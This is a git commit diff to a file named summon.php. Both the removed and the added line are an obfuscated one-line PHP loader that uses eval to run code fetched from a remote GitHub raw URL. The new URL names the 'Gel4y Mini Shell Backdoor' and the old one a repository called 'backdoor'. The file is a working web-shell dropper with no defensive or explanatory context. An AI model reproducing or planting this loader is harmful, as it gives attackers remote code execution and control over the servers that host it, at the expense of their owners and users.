404fc4cffb73318913a8e63e24aa7c3286f52437
herasec <148693984+herasec7@users.noreply.github.com>
2023-11-02 09:19:37 +0700

    Update summon.php

--- summon.php
+++ summon.php
@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /**/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/oldplayer69/backdoor/main/gelay.php"));/**/?>
+<?=/****/@null; /********/ /**/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php"));/**/?>
